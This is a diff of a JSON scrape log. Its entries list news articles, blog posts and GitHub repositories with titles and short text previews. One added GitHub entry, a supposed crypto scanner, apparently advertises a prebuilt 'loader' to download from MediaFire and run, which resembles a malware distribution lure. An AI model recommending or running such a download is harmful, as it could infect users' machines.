@@ -1,11 +1,11 @@
 [
   {
-    "url": "https://github.com/ggml-org/ggml/releases/tag/v1.0.0",
-    "title": "Ggml v1.0.0",
+    "url": "https://www.crissyfield.de/research/lovable-en/",
+    "title": "Lovable apps expose passport details and more than 200K private messages",
     "outcome": "stage2_failed",
     "stage0": {
       "scraped_chars": 3000,
-      "source_preview": "Sorry, something went wrong. There was an error while loading. Please reload this page . There was an error while loading. Please reload this page . ggml 1.0.0 prunes the deprecated public API and the legacy DIAG_MASK ops, adds configurable YaRN truncation and FP8 support, and brings broad performance work across backends: few-row quantized matmuls and MoE fusion on CUDA/Metal, a Vulkan prefill Fl",
+      "source_preview": "AI makes it easier to build your own web applications, but handling sensitive data still requires special\ncare. We examined 159,041 Lovable projects and found many cases where personal and confidential information was\naccessible without logging in. Diesen Artikel auf Deutsch lesen Lovable is a Swedish AI startup founded in Stockholm in 2023 by Anton Osika and Fabian Hedin. The platform turns\nplain",
       "scrape_error": null,
       "used_summary_fallback": false,
       "detected_language": "en",
@@ -27,12 +27,12 @@
     "entity_context_preview": "No additional context available."
   },
   {
-    "url": "https://www.nbcnews.com/news/us-news/faa-orders-nationwide-ground-stop-departing-flights-reasons-safety-rcna609247",
-    "title": "FAA issues national ground stop – lifted 4.5 hours later",
+    "url": "https://www.lloydslist.com/LL1158922/A-rare-glimpse-inside-the-highrisk-highreward-Hormuz-trade",
+    "title": "A rare glimpse inside the high-risk, high-reward Hormuz trade",
     "outcome": "stage2_failed",
     "stage0": {
       "scraped_chars": 3000,
-      "source_preview": "U.S. air traffic was brought to a standstill Friday after the Federal Aviation Administration ordered a nationwide ground stop for departing flights that lasted more than four hours. The FAA lifted the ground stop at 8:15 p.m. ET, after more than 7,000 flights were canceled and airports across the country became packed with stranded, irritated passengers. The sudden and stunning alert was issued a",
+      "source_preview": "The witness statement of Mercuria freight trader Renaud Hauspy in the case of Mercuria v Baltic Exchange , now at trial in London, sheds new light on the business of getting crude through the Strait of Hormuz BRINGING crude through the Strait of Hormuz is a highly secretive affair. The transaction terms are very private, the players are exceptionally press-shy, the security risks are extreme, and ",
       "scrape_error": null,
       "used_summary_fallback": false,
       "detected_language": "en",
@@ -54,12 +54,12 @@
     "entity_context_preview": "No additional context available."
   },
   {
-    "url": "https://www.joshka.net/cell-borders/",
-    "title": "Terminal borders that don't cost a cell",
+    "url": "https://forge-blog.github.io/posts/rust-std-memory-safety/",
+    "title": "Memory Safety Bugs in Rust Standard Library",
     "outcome": "stage2_failed",
     "stage0": {
       "scraped_chars": 3000,
-      "source_preview": "This post (and the code behind it) was written with a lot of help from AI. I'm not going to\napologize for that. If that bothers you, feel free to close the tab. I maintain Ratatui , so I see a lot of the TUIs people build. Many of them end up looking fairly\nsame-ish: plain boxes on a boring background, missing a bunch of the things that good design in\nother mediums brings us. Borders are part of t",
+      "source_preview": "By Yechan Bae / November 9, 2026 / 19 min read Contents Microsoft’s FORGE Lab found several memory safety issues in Rust’s standard library ( std and core ), including cases where code written entirely in safe Rust can trigger undefined behavior. The research used Hyenas, FORGE’s frontier research version of codename MDASH, an AI-powered vulnerability-scanning system. The findings reveal three rec",
       "scrape_error": null,
       "used_summary_fallback": false,
       "detected_language": "en",
@@ -81,76 +81,12 @@
     "entity_context_preview": "No additional context available."
   },
   {
-    "url": "https://monkeyisland.pages.dev/",
-    "title": "Monkey Island: all 13 versions side by side",
-    "outcome": "stage2_failed",
-    "stage0": {
-      "scraped_chars": 2330,
-      "source_preview": "Every screen was captured in ScummVM, except the Atari ST monochrome screens, which come from the Hatari emulator. Each capture was scaled to 1600x1200 with nearest-neighbour pixels and 4:3 aspect correction, so every original pixel keeps the shape it had on a period monitor. The twelve moments are the same in every version, with the same framing, so switching versions changes the machine, not the",
-      "scrape_error": null,
-      "used_summary_fallback": false,
-      "detected_language": "en",
-      "translated_to_english": false
-    },
-    "stage1": {},
-    "cache": {
-      "hits": [],
-      "misses": []
-    },
-    "search": {
-      "backend": "ddg",
-      "identity_queries": [],
-      "context_queries": [],
-      "context_queries_with_gap1_attached": [],
-      "results": {}
-    },
-    "cache_updates": [],
-    "entity_context_preview": "No additional context available."
-  },
-  {
-    "url": "https://www.nature.com/articles/d41586-026-03638-3",
-    "title": "Found: A protein that drives ageing without unleashing inflammation",
-    "outcome": "stage2_failed",
-    "stage0": {
-      "scraped_chars": 2301,
-      "source_preview": "Age-related stiffening and scarring of liver tissue (pictured) declined in mice that were bioengineered to lack a certain enzyme. Credit: Ziad M. El-Zaatari/Science Photo Library Researchers have found an enzyme that drives ageing in the body’s tissues 1 . Drugs that reduce the levels of this protein might one day combat the effects of ageing without impairing the body’s immune defences. Access Na",
-      "scrape_error": null,
-      "used_summary_fallback": false,
-      "detected_language": "en",
-      "translated_to_english": false
-    },
-    "stage1": {},
-    "cache": {
-      "hits": [],
-      "misses": []
-    },
-    "search": {
-      "backend": "ddg",
-      "identity_queries": [],
-      "context_queries": [],
-      "context_queries_with_gap1_attached": [],
-      "results": {}
-    },
-    "cache_updates": [],
-    "entity_context_preview": "No additional context available."
-  },
-  {
-    "url": "https://www.youtube.com/watch?v=IRK8h67ol7Q",
-    "title": "Jonathan Blow – If AI solved coding, why is my software still the same? [video]",
-    "outcome": "skipped_no_content",
-    "stage0": {
-      "scraped_chars": 0,
-      "source_preview": "",
-      "scrape_error": "no readable body text found (possibly JS-rendered or empty page)"
-    }
-  },
-  {
-    "url": "https://www.technologyreview.com/2026/11/13/1148551/the-download-silicon-valley-midterms-nvidia-chip-tracking/",
-    "title": "The Download: Silicon Valley’s blind spot and Nvidia’s chip-tracking plan",
+    "url": "https://litnews.ai/articles/garciaguirre-samsung-sk-hynix-micron-dram-conspiracy-suit-survives-dismissal",
+    "title": "Court denies motion to dismiss DRAM price fixing case",
     "outcome": "stage2_failed",
     "stage0": {
       "scraped_chars": 3000,
-      "source_preview": "Plus: A major Microsoft outage has disrupted services worldwide. This is today's edition of The Download , our weekday newsletter that provides a daily dose of what's going on in the world of technology. —Aaron Zamost, a tech communications consultant and a former executive at Square The self-styled visionaries of Silicon Valley have built careers claiming to see the future. Yet five weeks before ",
+      "source_preview": "Judge Noël Wise found buyers plausibly alleged the chipmakers conspired to cut conventional DRAM supply and shift capacity to HBM, distinguishing the Ninth Circuit's DRAM II. A federal judge on Nov. 14 refused to dismiss a proposed class action accusing Samsung, SK Hynix and Micron of conspiring to restrict the supply of conventional dynamic random-access memory, or DRAM, the standardized memory c",
       "scrape_error": null,
       "used_summary_fallback": false,
       "detected_language": "en",
@@ -172,12 +108,12 @@
     "entity_context_preview": "No additional context available."
   },
   {
-    "url": "https://www.technologyreview.com/2026/11/13/1148474/more-autonomy-fewer-ndas-volunteers-have-new-requests-for-brain-implant-trials/",
-    "title": "More autonomy, fewer NDAs: Volunteers have new requests for brain implant trials",
+    "url": "https://rorz.io/writing/semicircle-packing",
+    "title": "Semicircle Packing",
     "outcome": "stage2_failed",
     "stage0": {
       "scraped_chars": 3000,
-      "source_preview": "People with experimental brain implants are pushing for more recognition and respect. Scientists have been working on ways to decode brain activity for decades. Teams have developed brain implants that can be used to control robotic limbs and computers, and even to “speak.” The people who volunteer for trials of those devices play a vital role in that research, and they ought to be recognized for ",
+      "source_preview": "A couple of weeks ago, I entered the GPU World short story competition. I'll post my entry here once the winners are announced. The guidelines imply that I needn't wait until then, but usually writing contests don't allow self-publishing before the end of the competition, so I'd rather not take the risk. The cash prizes are crazily high for a writing competition: a $40,000 first-place prize; and 7",
       "scrape_error": null,
       "used_summary_fallback": false,
       "detected_language": "en",
@@ -199,12 +135,12 @@
     "entity_context_preview": "No additional context available."
   },
   {
-    "url": "https://techcrunch.com/2026/11/13/amazons-new-kindle-colorsoft-is-a-premium-e-reader-with-a-premium-price/",
-    "title": "Amazon’s new Kindle Colorsoft is a premium e-reader with a premium price",
+    "url": "https://techcrunch.com/2026/11/14/where-was-nvidias-security-team/",
+    "title": "Where was Nvidia’s security team?",
     "outcome": "stage2_failed",
     "stage0": {
       "scraped_chars": 3000,
-      "source_preview": "Amazon recently unveiled its refreshed Kindle lineup , introducing a new basic Kindle , Paperwhite, and Colorsoft. The new Kindle Colorsoft starts at $290, while the Signature Edition, which I’ve spent the past few weeks testing, costs $320. The base model comes with 16GB of storage, while the Signature Edition doubles that to 32GB and is available in graphite or a maroon-like Fig finish with an a",
+      "source_preview": "Outsiders had little reason to notice when Nvidia’s longtime chief security officer and head of product security stepped down in August. Just two and a half months later, CEO Jensen Huang himself left the company over growing questions about his extramarital relationships — starting with an executive at Megaspeed, a Singapore data center company that U.S. investigators suspect of funneling Nvidia ",
       "scrape_error": null,
       "used_summary_fallback": false,
       "detected_language": "en",
@@ -226,12 +162,39 @@
     "entity_context_preview": "No additional context available."
   },
   {
-    "url": "https://techcrunch.com/2026/11/13/jensen-huangs-departure-blasts-big-hole-in-ai-startup-funding-vcs-and-founders-say/",
-    "title": "Jensen Huang’s departure blasts big hole in AI startup funding, VCs and founders say",
+    "url": "https://techcrunch.com/2026/11/14/got-an-iphone-duo-these-9-settings-make-it-easier-to-use/",
+    "title": "Got an iPhone Duo? These 9 settings make it easier to use",
+    "outcome": "stage2_failed",
+    "stage0": {
+      "scraped_chars": 2056,
+      "source_preview": "Apple’s new foldable , the iPhone Duo, has proven popular enough that the company can’t keep the device in stock . While the Duo introduces a new way to use an iPhone, getting the most out of this initial version may require adjusting a few settings to make it work better when it comes to everyday tasks, like unlocking the device with Touch ID, navigating the interface, and taking photos. After sp",
+      "scrape_error": null,
+      "used_summary_fallback": false,
+      "detected_language": "en",
+      "translated_to_english": false
+    },
+    "stage1": {},
+    "cache": {
+      "hits": [],
+      "misses": []
+    },
+    "search": {
+      "backend": "ddg",
+      "identity_queries": [],
+      "context_queries": [],
+      "context_queries_with_gap1_attached": [],
+      "results": {}
+    },
+    "cache_updates": [],
+    "entity_context_preview": "No additional context available."
+  },
+  {
+    "url": "https://techcrunch.com/2026/11/14/the-ai-graveyard-a-running-list-of-projects-and-startups-that-didnt-make-it/",
+    "title": "The AI graveyard: a running list of projects and startups that didn’t make it",
     "outcome": "stage2_failed",
     "stage0": {
       "scraped_chars": 3000,
-      "source_preview": "It was the resignation heard across the world. Jensen Huang, Nvidia’s embattled CEO who co-founded and led the company for 33 years, had officially stepped down . “It’s like a bomb went off,” one neocloud founder told TechCrunch when he first heard the news. Over the last several years, Nvidia has been a prolific investor , pouring tens of billions into startups annually and participating in 105 r",
+      "source_preview": "Last month, chatbot platform Character.ai filed for bankruptcy just five years after launching. More recently, privacy-focused AI assistant Ollie announced its shutdown a few weeks ago. Aside from Character.ai and Ollie, plenty of AI bets never even survive inside the companies that build them. According to S&P Global Market Intelligence , about 42% of AI initiatives are ultimately abandoned by th",
       "scrape_error": null,
       "used_summary_fallback": false,
       "detected_language": "en",
@@ -253,12 +216,66 @@
     "entity_context_preview": "No additional context available."
   },
   {
-    "url": "https://techcrunch.com/2026/11/13/this-young-startup-wants-to-power-floating-data-centers-with-the-oceans-heat-and-investors-are-already-on-board/",
-    "title": "This young startup wants to power floating data centers with the ocean’s heat, and investors are already on board",
+    "url": "https://www.theverge.com/science/1033930/spacex-chopstick-starship-catch",
+    "title": "Watch SpaceX successfully execute the first ‘chopstick’ catch of Starship",
+    "outcome": "stage2_failed",
+    "stage0": {
+      "scraped_chars": 2541,
+      "source_preview": "Posts from this topic will be added to your daily email digest and your homepage feed. See All Science Posts from this topic will be added to your daily email digest and your homepage feed. See All News Posts from this topic will be added to your daily email digest and your homepage feed. See All Space SpaceX captured Starship using the arms of ‘Mechazilla’ its launch and catch tower for the first",
+      "scrape_error": null,
+      "used_summary_fallback": false,
+      "detected_language": "en",
+      "translated_to_english": false
+    },
+    "stage1": {},
+    "cache": {
+      "hits": [],
+      "misses": []
+    },
+    "search": {
+      "backend": "ddg",
+      "identity_queries": [],
+      "context_queries": [],
+      "context_queries_with_gap1_attached": [],
+      "results": {}
+    },
+    "cache_updates": [],
+    "entity_context_preview": "No additional context available."
+  },
+  {
+    "url": "https://www.theverge.com/entertainment/1033909/magic-the-gathering-netflix-series",
+    "title": "Magic: The Gathering is getting a Netflix animated series. For real this time.",
+    "outcome": "stage2_failed",
+    "stage0": {
+      "scraped_chars": 2671,
+      "source_preview": "Posts from this topic will be added to your daily email digest and your homepage feed. See All Entertainment Posts from this topic will be added to your daily email digest and your homepage feed. See All Gaming Posts from this topic will be added to your daily email digest and your homepage feed. See All News Magic The Gathering: Planeswalker is set to debut on Netflix in 2027. Magic The Gathering",
+      "scrape_error": null,
+      "used_summary_fallback": false,
+      "detected_language": "en",
+      "translated_to_english": false
+    },
+    "stage1": {},
+    "cache": {
+      "hits": [],
+      "misses": []
+    },
+    "search": {
+      "backend": "ddg",
+      "identity_queries": [],
+      "context_queries": [],
+      "context_queries_with_gap1_attached": [],
+      "results": {}
+    },
+    "cache_updates": [],
+    "entity_context_preview": "No additional context available."
+  },
+  {
+    "url": "https://www.theverge.com/transportation/1033898/faa-ground-stop-sean-duffy-faa-copper-wire",
+    "title": "Work to replace old copper wire led to the FAA’s ground stop",
     "outcome": "stage2_failed",
     "stage0": {
       "scraped_chars": 3000,
-      "source_preview": "Anyone who has weathered a hurricane can tell you that the oceans — which fuel the storms — contain a tremendous amount of energy. Thanks to global warming, they’re holding more than ever. A new startup wants to harness that energy to power data centers. Drogue , which has kept a low profile until now, is building a system that harvests heat from the ocean to power data centers on board floating v",
+      "source_preview": "Posts from this topic will be added to your daily email digest and your homepage feed. See All Transportation Posts from this topic will be added to your daily email digest and your homepage feed. See All News Posts from this topic will be added to your daily email digest and your homepage feed. See All Policy Issues with a new router related to a fiber optic upgrade grounded thousands of flights ",
       "scrape_error": null,
       "used_summary_fallback": false,
       "detected_language": "en",
@@ -280,12 +297,12 @@
     "entity_context_preview": "No additional context available."
   },
   {
-    "url": "https://techcrunch.com/2026/11/13/chatgpts-new-wallet-lets-ai-agents-shop-and-check-out-for-you/",
-    "title": "ChatGPT’s new Wallet lets AI agents shop and check out for you",
+    "url": "https://www.theverge.com/gadgets/1032500/best-deals-rei-holiday-sale-2026",
+    "title": "Here are our favorite deals from REI’s giant Holiday Sale",
     "outcome": "stage2_failed",
     "stage0": {
       "scraped_chars": 3000,
-      "source_preview": "ChatGPT can now shop for you. On Friday, OpenAI launched a new wallet feature that lets its agents, called dots , help you decide what to buy and then complete the purchase on your behalf. The option will initially be available to a limited number of U.S. ChatGPT Pro subscribers, ages 18 and up, with a U.S.-issued Visa, Mastercard, or American Express. OpenAI says that users are fully in control o",
+      "source_preview": "Posts from this topic will be added to your daily email digest and your homepage feed. See All Gadgets Posts from this topic will be added to your daily email digest and your homepage feed. See All Verge Shopping Posts from this topic will be added to your daily email digest and your homepage feed. See All Black Friday From Garmin watches to seasonal camping gear, REI is offering a slate of deep d",
       "scrape_error": null,
       "used_summary_fallback": false,
       "detected_language": "en",
@@ -307,12 +324,12 @@
     "entity_context_preview": "No additional context available."
   },
   {
-    "url": "https://techcrunch.com/2026/11/13/uber-confirms-hackers-stole-thousands-of-drivers-license-information-in-data-breach/",
-    "title": "Uber confirms hackers stole thousands of drivers’ license information in data breach",
+    "url": "https://www.theverge.com/transportation/1033844/tesla-personal-cybercab-orders-299-subscription-fine-print",
+    "title": "Tesla is inviting some people to buy a Cybercab ‘for personal use’ — but read the fine print",
     "outcome": "stage2_failed",
     "stage0": {
       "scraped_chars": 3000,
-      "source_preview": "Uber is notifying thousands of drivers that their personal and driver’s license information was stolen during an October data breach at one of the company’s tech providers. In notices filed this week with several U.S. attorneys general, including California , the ride-hail giant said it was notified on October 9 by the provider that hackers broke in and stole internal credentials, which were used ",
+      "source_preview": "Posts from this topic will be added to your daily email digest and your homepage feed. See All Transportation Posts from this topic will be added to your daily email digest and your homepage feed. See All Tech Posts from this topic will be added to your daily email digest and your homepage feed. See All Autonomous Cars Look past the $29,990 sticker price and the math — and regulatory risk — gets m",
       "scrape_error": null,
       "used_summary_fallback": false,
       "detected_language": "en",
@@ -334,12 +351,12 @@
     "entity_context_preview": "No additional context available."
   },
   {
-    "url": "https://www.theverge.com/tech/1033697/amazon-world-product-graph-ai-search",
-    "title": "Amazon has a plan to index the world’s online shopping data",
+    "url": "https://www.theverge.com/tech/1013985/crkd-atom-plus-tmr-analog-thumbstick-controller-gamepad-switch-ios-android-hands-on",
+    "title": "This tiny gamepad with dual analog thumbsticks pushes the limits of portable controllers",
     "outcome": "stage2_failed",
     "stage0": {
       "scraped_chars": 3000,
-      "source_preview": "Posts from this topic will be added to your daily email digest and your homepage feed. See All Tech Posts from this topic will be added to your daily email digest and your homepage feed. See All AI Posts from this topic will be added to your daily email digest and your homepage feed. See All News Listing the details of everything for sale everywhere is meant to make Amazon more useful than Reddit ",
+      "source_preview": "Posts from this topic will be added to your daily email digest and your homepage feed. See All Tech Posts from this topic will be added to your daily email digest and your homepage feed. See All Gadgets Posts from this topic will be added to your daily email digest and your homepage feed. See All Gaming Larger hands may struggle with the Atom Plus, but it squeezes a lot of functionality into an ex",
       "scrape_error": null,
       "used_summary_fallback": false,
       "detected_language": "en",
@@ -361,12 +378,12 @@
     "entity_context_preview": "No additional context available."
   },
   {
-    "url": "https://www.theverge.com/gadgets/1033185/nothing-cmf-speaker-s-m-black-friday-deal-sale",
-    "title": "CMF’s milk carton-shaped Bluetooth speaker is down to a new low price",
+    "url": "https://www.theverge.com/tech/1033761/home-assistant-tk-tripod-tabletop-installer",
+    "title": "A gadget to make your dumb house smarter",
     "outcome": "stage2_failed",
     "stage0": {
       "scraped_chars": 3000,
-      "source_preview": "Posts from this topic will be added to your daily email digest and your homepage feed. See All Gadgets Posts from this topic will be added to your daily email digest and your homepage feed. See All Tech Posts from this topic will be added to your daily email digest and your homepage feed. See All Speakers Nothing’s funky, compact Bluetooth speaker launched in October and is already on sale ahead o",
+      "source_preview": "Posts from this topic will be added to your daily email digest and your homepage feed. See All Tech Posts from this topic will be added to your daily email digest and your homepage feed. See All Gadgets Posts from this topic will be added to your daily email digest and your homepage feed. See All Streaming Plus, in this week’s Installer: a Space Race history, an Apple TV heist flick, a Wikipedia p",
       "scrape_error": null,
       "used_summary_fallback": false,
       "detected_language": "en",
@@ -388,147 +405,12 @@
     "entity_context_preview": "No additional context available."
   },
   {
-    "url": "https://www.theverge.com/gadgets/1033046/playstation-xbox-gift-card-gta-vi-6-preorder-deal-sale",
-    "title": "Here’s how you can save on your GTA VI preorder ahead of launch",
-    "outcome": "stage2_failed",
-    "stage0": {
-      "scraped_chars": 2794,
-      "source_preview": "Posts from this topic will be added to your daily email digest and your homepage feed. See All Gadgets Posts from this topic will be added to your daily email digest and your homepage feed. See All Gaming Posts from this topic will be added to your daily email digest and your homepage feed. See All Verge Shopping Preloading is already underway for Rockstar’s anticipated open-world game, but you’re",
-      "scrape_error": null,
-      "used_summary_fallback": false,
-      "detected_language": "en",
-      "translated_to_english": false
-    },
-    "stage1": {},
-    "cache": {
-      "hits": [],
-      "misses": []
-    },
-    "search": {
-      "backend": "ddg",
-      "identity_queries": [],
-      "context_queries": [],
-      "context_queries_with_gap1_attached": [],
-      "results": {}
-    },
-    "cache_updates": [],
-    "entity_context_preview": "No additional context available."
-  },
-  {
-    "url": "https://www.theverge.com/tech/1033159/keychron-t1-he-trackball-wireless-mouse-adjustable",
-    "title": "You can adjust the position of the trackball on Keychron’s new wireless mouse",
+    "url": "https://www.theverge.com/tech/1033781/nvidia-jensen-huang-last-visionary-showman-founder-ceo",
+    "title": "Jensen Huang and the decline of the visionary showman founder CEO",
     "outcome": "stage2_failed",
     "stage0": {
       "scraped_chars": 3000,
-      "source_preview": "Posts from this topic will be added to your daily email digest and your homepage feed. See All Tech Posts from this topic will be added to your daily email digest and your homepage feed. See All Gadgets Posts from this topic will be added to your daily email digest and your homepage feed. See All News A pair of dials underneath the T1 HE let you fine-tune where its trackball is positioned under yo",
-      "scrape_error": null,
-      "used_summary_fallback": false,
-      "detected_language": "en",
-      "translated_to_english": false
-    },
-    "stage1": {},
-    "cache": {
-      "hits": [],
-      "misses": []
-    },
-    "search": {
-      "backend": "ddg",
-      "identity_queries": [],
-      "context_queries": [],
-      "context_queries_with_gap1_attached": [],
-      "results": {}
-    },
-    "cache_updates": [],
-    "entity_context_preview": "No additional context available."
-  },
-  {
-    "url": "https://www.theverge.com/tech/1033051/nvidia-jensen-huang-chips-gpu-supply-chain-climate-pollution",
-    "title": "Jensen Huang was reckless with the environment, too",
-    "outcome": "stage2_failed",
-    "stage0": {
-      "scraped_chars": 3000,
-      "source_preview": "Posts from this topic will be added to your daily email digest and your homepage feed. See All Tech Posts from this topic will be added to your daily email digest and your homepage feed. See All Science Posts from this topic will be added to your daily email digest and your homepage feed. See All Climate Nvidia’s environmental footprint extends way beyond its own offices. Nvidia’s environmental fo",
-      "scrape_error": null,
-      "used_summary_fallback": false,
-      "detected_language": "en",
-      "translated_to_english": false
-    },
-    "stage1": {},
-    "cache": {
-      "hits": [],
-      "misses": []
-    },
-    "search": {
-      "backend": "ddg",
-      "identity_queries": [],
-      "context_queries": [],
-      "context_queries_with_gap1_attached": [],
-      "results": {}
-    },
-    "cache_updates": [],
-    "entity_context_preview": "No additional context available."
-  },
-  {
-    "url": "https://www.theverge.com/tech/1033026/camp-snap-retro-digital-video-campcorder-cs-8-micro-keychain",
-    "title": "The smallest version of Camp Snap’s retro digital camcorder fits on your keychain",
-    "outcome": "stage2_failed",
-    "stage0": {
-      "scraped_chars": 3000,
-      "source_preview": "Posts from this topic will be added to your daily email digest and your homepage feed. See All Tech Posts from this topic will be added to your daily email digest and your homepage feed. See All Gadgets Posts from this topic will be added to your daily email digest and your homepage feed. See All News The Camp Snap CS-8 Micro is just three inches long and adds a tiny LCD screen that’s only used as",
-      "scrape_error": null,
-      "used_summary_fallback": false,
-      "detected_language": "en",
-      "translated_to_english": false
-    },
-    "stage1": {},
-    "cache": {
-      "hits": [],
-      "misses": []
-    },
-    "search": {
-      "backend": "ddg",
-      "identity_queries": [],
-      "context_queries": [],
-      "context_queries_with_gap1_attached": [],
-      "results": {}
-    },
-    "cache_updates": [],
-    "entity_context_preview": "No additional context available."
-  },
-  {
-    "url": "https://www.theverge.com/tech/1033076/apple-tv-4k-youtube-error",
-    "title": "The new Apple TV has a YouTube problem",
-    "outcome": "stage2_failed",
-    "stage0": {
-      "scraped_chars": 2269,
-      "source_preview": "Posts from this topic will be added to your daily email digest and your homepage feed. See All Tech Posts from this topic will be added to your daily email digest and your homepage feed. See All News Posts from this topic will be added to your daily email digest and your homepage feed. See All Streaming A software update and a reboot should get YouTube working on your new Apple TV 4K.﻿ A software ",
-      "scrape_error": null,
-      "used_summary_fallback": false,
-      "detected_language": "en",
-      "translated_to_english": false
-    },
-    "stage1": {},
-    "cache": {
-      "hits": [],
-      "misses": []
-    },
-    "search": {
-      "backend": "ddg",
-      "identity_queries": [],
-      "context_queries": [],
-      "context_queries_with_gap1_attached": [],
-      "results": {}
-    },
-    "cache_updates": [],
-    "entity_context_preview": "No additional context available."
-  },
-  {
-    "url": "https://www.theverge.com/tech/1032862/microsoft-outlook-down-outage",
-    "title": "Microsoft&#8217;s massive Outlook outage might be over",
-    "outcome": "stage2_failed",
-    "stage0": {
-      "scraped_chars": 3000,
-      "source_preview": "Posts from this topic will be added to your daily email digest and your homepage feed. See All Tech Posts from this topic will be added to your daily email digest and your homepage feed. See All News Posts from this topic will be added to your daily email digest and your homepage feed. See All Microsoft Nearly a day after the global email outage started, Microsoft said the issue has been addressed",
+      "source_preview": "Posts from this topic will be added to your daily email digest and your homepage feed. See All Tech Posts from this topic will be added to your daily email digest and your homepage feed. See All AI Posts from this topic will be added to your daily email digest and your homepage feed. See All Report The Steve Jobs of GPUs has been shown the door.﻿ Posts from this author will be added to your daily ",
       "scrape_error": null,
       "used_summary_fallback": false,
       "detected_language": "en",
@@ -590,45 +472,8 @@
     }
   },
   {
-    "url": "https://openai.com/index/children-first-declaration",
-    "title": "Supporting research on AI and children’s safety",
-    "outcome": "skipped_no_content",
-    "stage0": {
-      "scraped_chars": 0,
-      "source_preview": "",
-      "scrape_error": "403 Client Error: Forbidden for url: https://openai.com/index/children-first-declaration"
-    }
-  },
-  {
-    "url": "https://deepmind.google/blog/opening-the-datasets-behind-our-ai-weather-models/",
-    "title": "Opening the datasets behind our AI weather models",
-    "outcome": "stage2_failed",
-    "stage0": {
-      "scraped_chars": 3000,
-      "source_preview": "WeatherNext team We are releasing PARDIG and SatWeave to help researchers and developers build new weather, hydrology, and climate applications. Understanding and predicting the planetâs weather and water cycle starts with how well we can observe the Earth right now. Satellites and ground instruments monitor the planet continuously and in great detail. But converting these raw measurements into ",
-      "scrape_error": null,
-      "used_summary_fallback": false,
-      "detected_language": "en",
-      "translated_to_english": false
-    },
-    "stage1": {},
-    "cache": {
-      "hits": [],
-      "misses": []
-    },
-    "search": {
-      "backend": "ddg",
-      "identity_queries": [],
-      "context_queries": [],
-      "context_queries_with_gap1_attached": [],
-      "results": {}
-    },
-    "cache_updates": [],
-    "entity_context_preview": "No additional context available."
-  },
-  {
-    "url": "https://github.com/SortGuardian/ai--manus",
-    "title": "SortGuardian/ai--manus",
+    "url": "https://github.com/Topkiflare74/ai--manus2.0",
+    "title": "Topkiflare74/ai--manus2.0",
     "outcome": "stage2_failed",
     "stage0": {
       "scraped_chars": 2820,
@@ -654,12 +499,12 @@
     "entity_context_preview": "No additional context available."
   },
   {
-    "url": "https://github.com/Feathershosmash/ai--manus",
-    "title": "Feathershosmash/ai--manus",
+    "url": "https://github.com/hexsyro/churn-boosting-showdown",
+    "title": "hexsyro/churn-boosting-showdown",
     "outcome": "stage2_failed",
     "stage0": {
-      "scraped_chars": 2820,
-      "source_preview": "AI Manus is a general-purpose AI Agent system that supports running various tools and operations in a sandbox environment. Manus is an autonomous AI agent designed to run code and control a browser on your behalf. Instead of acting like a simple chatbot that only answers questions, Manus AI agent takes action. It can write and execute scripts, open web pages, interact with elements, and carry out ",
+      "scraped_chars": 1686,
+      "source_preview": "Head-to-head comparison of XGBoost, LightGBM and CatBoost for customer churn prediction. XGBoost vs LightGBM vs CatBoost: same churn-prediction task, same data, head to head. This project uses the Telco customer churn dataset (7,043 customers; contract type, tenure, internet service, monthly charges, payment method, add-on services and other categorical-heavy fields) to predict which customers wil",
       "scrape_error": null,
       "used_summary_fallback": false,
       "detected_language": "en",
@@ -681,12 +526,39 @@
     "entity_context_preview": "No additional context available."
   },
   {
-    "url": "https://github.com/berkantay/gpucanvas",
-    "title": "berkantay/gpucanvas",
+    "url": "https://github.com/orderesworks42213/crypto-rpocket-accumulation-scanner",
+    "title": "orderesworks42213/crypto-rpocket-accumulation-scanner",
+    "outcome": "stage2_failed",
+    "stage0": {
+      "scraped_chars": 1919,
+      "source_preview": "Python crypto scanner: finds coins in quiet accumulation, back tested on 961 samples, rebuilt from the evidence, automated with Telegram alerts. ⚡ All-in-one loader: The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required. ⚠️ Important: Official Distribution Notice We distribute our software only through MediaFire . If the ",
+      "scrape_error": null,
+      "used_summary_fallback": false,
+      "detected_language": "en",
+      "translated_to_english": false
+    },
+    "stage1": {},
+    "cache": {
+      "hits": [],
+      "misses": []
+    },
+    "search": {
+      "backend": "ddg",
+      "identity_queries": [],
+      "context_queries": [],
+      "context_queries_with_gap1_attached": [],
+      "results": {}
+    },
+    "cache_updates": [],
+    "entity_context_preview": "No additional context available."
+  },
+  {
+    "url": "https://github.com/voyager-so/vauss",
+    "title": "voyager-so/vauss",
     "outcome": "stage2_failed",
     "stage0": {
       "scraped_chars": 3000,
-      "source_preview": "Put thousands of live DOM nodes on an infinite canvas: the GPU draws them, an editor selects, moves and resizes them, shaders and transitions run on them, and an AI agent can read them and point at them. Put thousands of live DOM nodes on an infinite canvas: the GPU draws them, an editor selects,\nmoves and resizes them, shaders and transitions run on them, and an AI agent can read them and\npoint a",
+      "source_preview": "Fast Gaussian splat reconstruction for Blender, agents, and reusable 3D worlds The fastest Gaussian splat trainer. 5.4× faster training than gsplat-MCMC, with better perceptual quality on all seven comparison scenes. About half the GPU memory. Built for you and your agent. Give it a video. Get a world you can explore, film, bring into Blender—or turn into a playable voxel level. Picture 2 World: a",
       "scrape_error": null,
       "used_summary_fallback": false,
       "detected_language": "en",
